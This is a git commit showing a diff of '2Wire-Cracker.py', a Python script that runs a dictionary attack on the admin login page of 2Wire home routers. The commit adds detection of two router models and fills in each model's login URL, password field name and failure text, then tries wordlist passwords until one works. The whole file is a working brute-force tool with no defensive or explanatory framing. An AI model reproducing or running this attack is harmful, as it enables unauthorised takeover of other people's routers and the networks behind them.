b0d90214453c4cda22f5728dec1c7451e667e9e6
Dennis Linuz <dennismald@gmail.com>
2012-04-22 01:37:53 -0500

    modified:   2Wire-Cracker.py

--- 2Wire-Cracker.py
+++ 2Wire-Cracker.py
@@ -6,22 +6,35 @@
 #################################################
 import mechanize, sys
 
-if len(sys.argv) != 3:
-	print "Usage:\n\tpython 2Wire-Cracker.py <Router Login URL> <Wordlist>\n\nExample:\n\tpython 2Wire-Cracker.py \"http://192.168.1.254/xslt?PAGE=C_0_1\" \"common_passwords.txt\""
-	quit()
-ROUTERURL = sys.argv[1]
-WORDLIST = sys.argv[2]
-FAILED_TEXT = "Login failed"
+#if len(sys.argv) != 4:
+#	print 'Usage:\n\tpython 2Wire-Cracker.py <Router Login URL> <Wordlist>\n\nExample:\n\tpython 2Wire-Cracker.py "http://192.168.1.254/xslt?PAGE=C_0_1" "common_passwords.txt" "The password is incorrect."'
+#	quit()
+
 browser = mechanize.Browser()
-file = open(WORDLIST,"r")
-html = browser.open(ROUTERURL).read()
-for word in file:
-	word = word.replace("\n","")
-	print "Trying: " + word
-	browser.select_form(nr=0)
-	browser.form['ADM_PASSWORD'] = word
-	html = browser.submit().read()
-	if not FAILED_TEXT in html:
-		print "Password found: " + word
-		break
-file.close()
+
+def dictionaryAttack(routerUrl, inputName, failedText):
+	file = open(wordlist,"r")
+	html = browser.open(routerUrl).read()
+	for word in file:
+		word = word.replace("\n","")
+		print "Trying: " + word
+		browser.select_form(nr=0)
+		browser.form[inputName] = word
+		html = browser.submit().read()
+		if not failedText in html:
+			print "Password found: " + word
+			break
+	file.close()
+
+routerAddress = "http://"+sys.argv[1]
+wordlist = sys.argv[2]
+
+versionCheck = browser.open(routerAddress).read()
+if "3800HGV-B" in versionCheck:
+	print "Router Version Found: 3800HGV-B"
+	dictionaryAttack(routerAddress + "/xslt?PAGE=C_0_1", "ADM_PASSWORD", "Login failed")
+elif "2701HG-B" in versionCheck:
+	print "Router Version Found: 2701HG-B"
+	dictionaryAttack(routerAddress + "/xslt?PAGE=A05", "PASSWORD", "The password is incorrect.")
+else:
+	print "Router version not found or supported... Stopping."	
